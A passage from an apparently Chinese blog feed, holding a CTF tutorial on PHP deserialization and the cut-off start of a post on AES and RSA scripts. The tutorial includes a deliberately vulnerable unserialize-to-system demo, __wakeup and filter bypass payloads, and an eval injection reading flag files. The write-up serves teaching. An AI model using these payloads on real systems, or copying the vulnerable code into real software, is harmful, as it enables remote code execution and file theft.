data-original="https://img-blog.csdnimg.cn/20210410195335115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210410195352403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210410195406365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021041019541950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> EDUSRC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> src </tag>
            
            <tag> 荣誉 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf中的php序列化与反序列化</title>
      <link href="/posts/69a2a2e8.html"/>
      <url>/posts/69a2a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="ctf中的php序列化与反序列化"><a href="#ctf中的php序列化与反序列化" class="headerlink" title="ctf中的php序列化与反序列化"></a>ctf中的php序列化与反序列化</h1><p>  刚开始学的php序列化与反序列化，有点雨里雾里的，于是做个笔记~~</p><p>首先我们来了解一下概念知道他是怎么样的一个东西：</p><p>序列化（串行化）：是将变量转换为可保存或传输的字符串的过程；<br>反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。<br>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p>然后了解魔术方法：</p><pre><code>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。__toString：当对象被当做一个字符串使用时调用。__sleep:序列化对象之前就调用此方法(其返回需要一个数组)__wakeup:反序列化恢复对象之前调用该方法__call:当调用对象中不存在的方法会自动调用该方法。__get:在调用私有属性的时候会自动执行__isset()在不可访问的属性上调用isset()或empty()触发__unset()在不可访问的属性上使用unset()时触发</code></pre><p>常见的方法有前面五个，所以尽量关注前面五个，下面我们看看每个方法的用法以及效果。<a id="more"></a></p><p>测试的源码：</p><pre><code>&lt;?phpclass SER{    public $name;    private $age;    protected $sec;   public function __construct()   {       echo "这是__construct()!在创建对象时使用，例如：\$aa = new SER();";       echo "\n";   }   public function __destruct()   {       echo "这是__destruct()!在调用完后销毁对象时使用";       echo "\n";   }   public function __toString()   {      echo "这是__toString()!当对象被当做一个字符串使用时调用   ";      return  "and must have return "."\n";   }   public function __sleep()   {       echo "这是__sleep()!在序列化一个对象时使用，例如:serialize()";       echo "\n";   }   public function __wakeup()   {       echo "这是__wakeup()!在反序列化一个对象时使用，例如:unserialize()";       echo "\n";   }}$mirror = new SER(); //__construct()//echo $mirror;   //__toString()//serialize($mirror);  //__sleep()//unserialize($mirror);  //__wakeup()                        //__destruct()</code></pre><p>__construct()的示例：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108190111162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><strong>construct()、</strong>toString()的示例：</p><p>需要注意的是__toString()必须要有一个返回值。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108190221146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><strong>construct()、</strong>toString()、<strong>sleep()的示例：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108190356892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>__construct()、</strong>toString()、<strong>sleep()、</strong>wakeup()的示例：</p><p>因为序列化和反序列化分别调用了一次，所以__destruct()也出现了两次</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108190856489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>接下来我们看序列化的格式：</p><pre><code>O:3:"SER":3:{s:4:"name";s:6:"mirror";s:8:" SER age";s:2:"18";s:6:" * sec";s:2:"男";}对象类型:长度:"名字":类中变量的个数:{类型:长度:"名字";类型:长度:"值";......}</code></pre><p>然后看序列化的三种类型：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108193339411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>序列化后的结果为：O:3:”SER”:3:{s:4:”name”;s:6:”mirror”;s:8:” SER age”;s:2:”18”;s:6:” * sec”;s:2:”男”;}，仔细观察我们就会发现每一个类型输出的都不一样。</p><pre><code> public   //{s:4:"name";s:6:"mirror"-&gt;序列出来的变量直接是变量名name private  //s:8:" SER age";s:2:"18"-&gt;序列出来的变量是：%00+类名+%00+变量名（两个%00加上字符所以长度为8）或者\00 protected  //s:6:" * sec";s:2:"男"-&gt;序列出来的变量是：%00+*+%00+变量名  （两个%00加上字符所以长度为6）或者\00</code></pre><p>因为%00是不可打印字符，显示不了，但是查看网页源码可以看到乱码，但是他是存在的。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108194632792.png#pic_center" alt=""></p><p>接下来我们写一个简单反序列化可控参数的代码，清楚直观的感受序列化与反序列化</p><pre><code>&lt;?phpclass A{    public $cmd;    public function __wakeup()    {        system($this-&gt;cmd);    }}$a = $_GET['cmd'];$a_unser = unserialize($a);?&gt;</code></pre><p>前面我们说过__wakeup()在被反序列时使用，现在代码中的cmd我们可控，我们就可以做一个恶意的序列化代码，让他在进行反序列化的时候能够执行我们想要的命令。</p><pre><code>O:1:"A":1:{s:3:"cmd";s:3:"dir";}</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110820133450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>拿payload去测试，可以看到命令被执行了，只不过由于环境编码的问题，这里乱码了</p><pre><code>?cmd=O:1:"A":1:{s:3:"cmd";s:3:"dir";}</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108201148361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>接下来进入正题，ctf中绕过__wakeup(),这里取自BUUCTF的： [极客大挑战 2019]PHP</p><p>扫网站的备份文件得备份文件名是<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><p>里面有用的php文件：class.php</p><pre><code>&lt;?phpinclude 'flag.php';error_reporting(0);class Name{    private $username = 'nonono';    private $password = 'yesyes';    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = 'guest';    }    function __destruct(){        if ($this-&gt;password != 100) {            echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";            echo "You name is: ";            echo $this-&gt;username;echo "&lt;/br&gt;";            echo "You password is: ";            echo $this-&gt;password;echo "&lt;/br&gt;";            die();        }        if ($this-&gt;username === 'admin') {            global $flag;            echo $flag;        }else{            echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";            die();        }    }}?&gt;</code></pre><p>在构造序列化函数的时候会把属性赋值， 不过这个我们能控制，不用纠结</p><pre><code>$username = 'nonono';$password = 'yesyes';</code></pre><p>真正重要的是反序列时调用的两个方法，<strong>wakeup()、</strong>destruct()，在进行反序列化操作的时候，<strong>wakeup()方法总会把你的username变成guest，这样子的话就过不了</strong>destruct()的要求：需要password=100，username=admin。</p><p>但是__wakeup()本身有一个漏洞：<br>CVE-2016-7124<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p><p>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，所以接下来制造payload</p><pre><code>O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";s:3:"100";}</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108204308966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>我们使属性个数大于真实个数，并且要注意他的类型是私有类型，要加上%00,所以最后的payload为：</p><pre><code>?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}</code></pre><p>拿到flag<br>这题用%00成功用\00失败<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108205329729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>下一个是绕过字符串过滤</p><p>例题取自[网鼎杯 2020 青龙组]AreUSerialz</p><pre><code>&lt;?phpinclude("flag.php");highlight_file(__FILE__);class FileHandler {    protected $op;    protected $filename;    protected $content;    function __construct() {        $op = "1";        $filename = "/tmp/tmpfile";        $content = "Hello World!";        $this-&gt;process();    }    public function process() {        if($this-&gt;op == "1") {            $this-&gt;write();        } else if($this-&gt;op == "2") {            $res = $this-&gt;read();            $this-&gt;output($res);        } else {            $this-&gt;output("Bad Hacker!");        }    }    private function write() {        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {            if(strlen((string)$this-&gt;content) &gt; 100) {                $this-&gt;output("Too long!");                die();            }            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output("Successful!");            else $this-&gt;output("Failed!");        } else {            $this-&gt;output("Failed!");        }    }    private function read() {        $res = "";        if(isset($this-&gt;filename)) {            $res = file_get_contents($this-&gt;filename);        }        return $res;    }    private function output($s) {        echo "[Result]: &lt;br&gt;";        echo $s;    }    function __destruct() {        if($this-&gt;op === "2")            $this-&gt;op = "1";        $this-&gt;content = "";        $this-&gt;process();    }}function is_valid($s) {    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;}if(isset($_GET{'str'})) {    $str = (string)$_GET['str'];    if(is_valid($str)) {        $obj = unserialize($str);    }}</code></pre><p>GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化。</p><pre><code>function is_valid($s) {    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;}if(isset($_GET{'str'})) {    $str = (string)$_GET['str'];    if(is_valid($str)) {        $obj = unserialize($str);    }</code></pre><p>这里的op是强类型比较，如果类型为string值为2的话，op就会被赋值为1，否则，content为空并进入下一个函数</p><pre><code>    function __destruct() {        if($this-&gt;op === "2")            $this-&gt;op = "1";        $this-&gt;content = "";        $this-&gt;process();    }</code></pre><p>这里的op是弱类型比较，只要值为2就可以进入下一个函数，因为op为1是写函数对我们没用，所以不做分析，到现在我们要先绕过强类型限制来到该函数<br>绕过方法：op=2，这里的2是整数int类型，op=2时，op===”2” 为false，op==”2”为true，就可以来到该函数<br>string和int的区别和比较<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108215102317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>public function process() {        if($this-&gt;op == "1") {            $this-&gt;write();        } else if($this-&gt;op == "2") {            $res = $this-&gt;read();            $this-&gt;output($res);        } else {            $this-&gt;output("Bad Hacker!");        }    }</code></pre><p>这里是一个读文件的函数，我们要包含flag.php就好</p><pre><code>    private function read() {        $res = "";        if(isset($this-&gt;filename)) {            $res = file_get_contents($this-&gt;filename);        }        return $res;    }</code></pre><p>我们可以通过控制read()读取flag.php的内容。</p><p>但是现在需要绕过is_valid() 函数<br>is_valid()函数规定字符的ASCII码必须是32-125，而protected属性在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求。</p><p>绕过方法：</p><p>①PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过</p><pre><code>&lt;?phpclass FileHandler {    public $op = 2;    public $filename = "flag.php";    public $content="s";  //任意}$mirror = new FileHandler();echo serialize($mirror);?&gt;</code></pre><p>poyload:</p><pre><code>O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:1:"s";}</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108215621788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>②protected属性会引入\00*\00，但是序列化字符串中表示字符类型的s大写时，该值会被当成16进制解析。</p><pre><code>&lt;?phpclass FileHandler {    protected $op = 2;    protected $filename = "flag.php";    protected $content="s";  //任意}$mirror = new FileHandler();echo serialize($mirror);?&gt;</code></pre><p>payload：</p><pre><code>O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:1:"s";}</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108220802469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>这题用\00成功用%00失败</p><p>下一个是绕过正则</p><p>取自19年百度杯十月赛的hash</p><p>1.$hash=md5($sign.$key);the length of $sign is 8</p><p>2.key=123&amp;hash=f9109d5f83921a551cf859f853afe7bb</p><p>然后md5解密那个hash=kkkkkk01123</p><p>根据源码说的$sign位数为8位，后改一下key 然后md5后得到提示Gu3ss_m3_h2h2.php这个文件</p><p>poyload：</p><pre><code>?key=12&amp;hash=3fa25df8b0dbc0be0840be63792b1610</code></pre><p>得到一个页面：Gu3ss_m3_h2h2.php，进去看见源码</p><pre><code>&lt;?phpclass Demo {    private $file = 'Gu3ss_m3_h2h2.php';    public function __construct($file) {        $this-&gt;file = $file;    }    function __destruct() {        echo @highlight_file($this-&gt;file, true);    }    function __wakeup() {        if ($this-&gt;file != 'Gu3ss_m3_h2h2.php') {            //the secret is in the f15g_1s_here.php            $this-&gt;file = 'Gu3ss_m3_h2h2.php';        }    }}if (isset($_GET['var'])) {    $var = base64_decode($_GET['var']);    if (preg_match('/[oc]:\d+:/i', $var)) {        die('stop hacking!');    } else {        @unserialize($var);    }} else {    highlight_file("Gu3ss_m3_h2h2.php");}?&gt;</code></pre><p>在这里要绕过两点：<br>1、 __wakeup() 函数，用我们前面提到的那个方法就好<br>2、绕过正则，不能出现像O:4这样子的字符串，说白了就是针对需序列化的字符串的，可以在数字前面加+号，如O:+4</p><p>所以payload：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110823022028.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>这里把得到序列化字符串加上%00在ps上base64加密后也不能正确加密，所以先把字符串放到burp上显示十六进制将20都换为00再base64加密得到的payload才能用，记得在4前面加上+<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108230558270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>进入下一层</p><pre><code>&lt;?phpif (isset($_GET['val'])) {    $val = $_GET['val'];    eval('$value="' . addslashes($val) . '";');} else {    die('hahaha!');}?&gt;</code></pre><p>addslashes()函数主要用来过滤单、双引号，用不了system<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108230656906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>我们这样构造：</p><pre><code>/f15g_1s_here.php?val=${eval($_GET[a])}&amp;a=echo `ls`;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108231358635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>利用的原理就是像这样实现命令执行：</p><pre><code>${phpinfo()} </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108232434115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>这样成功执行了ls命令，发现了flag所在的文件，然后cat就可以获得flag:</p><pre><code>/f15g_1s_here.php?val=${eval($_GET[a])}&amp;a=echo `cat True_F1ag_i3_Here_233.php`;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201108231526142.png#pic_center" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AES、RSA密码py脚本</title>
      <link href="/posts/29a2a2e8.html"/>
      <url>/posts/29a2a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="AES密码"><a href="#AES密码" class="headerlink" title="AES密码"></a>AES密码</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time : 2020-12-23 8:13</span><span class="token comment" spellcheck="true"># @File : AES密码.py</span><span class="token comment" spellcheck="true"># @Author : mirror</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> binascii <span class="token keyword">import</span> b2a_hex<span class="token punctuation">,</span> a2b_hex<span class="token keyword">import</span> base64add <span class="token operator">=</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># 如果text不足16位的倍数就用空格补足为16位</span><span class="token keyword">def</span> <span class="token function">add_to_16</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token punctuation">:</span>        add <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        add <span class="token operator">=</span> <span class="token number">0</span>    text <span class="token operator">=</span> text <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'\0'</span><span class="token operator">*</span>add<span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 加密函数</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'9999999999999999'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    iv <span class="token operator">=</span> b<span class="token string">'qqqqqqqqqqqqqqqq'</span>    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC    cryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    text <span class="token operator">=</span> add_to_16<span class="token punctuation">(</span>text<span class="token punctuation">)</span>    cipher_text <span class="token operator">=</span> cryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里需要转为16进制字符串</span>    <span class="token keyword">return</span> b2a_hex<span class="token punctuation">(</span>cipher_text<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 解密后，去掉补足的空格用rstrip() 去掉</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'9999999999999999'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    iv <span class="token operator">=</span> b<span class="token string">'qqqqqqqqqqqqqqqq'</span>    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC    cryptos <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    plain_text <span class="token operator">=</span> cryptos<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>a2b_hex<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    e <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 加密</span>    e <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>e<span class="token punctuation">)</span>    d <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>e<span class="token punctuation">)</span>    d <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>d<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 解密</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密:"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>e<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密:"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201225001635456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="RSA密码"><a href="#RSA密码" class="headerlink" title="RSA密码"></a>RSA密码</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time : 2020-12-24 20:20</span><span class="token comment" spellcheck="true"># @File : RSA密码.py</span><span class="token comment" spellcheck="true"># @Author : mirror</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_v1_5<span class="token keyword">import</span> base64<span class="token keyword">from</span> Crypto <span class="token keyword">import</span> Random<span class="token comment" spellcheck="true"># 伪随机数生成器</span>random_generator <span class="token operator">=</span> Random<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token comment" spellcheck="true"># rsa算法生成实例</span>rsa <span class="token operator">=</span> RSA<span class="token 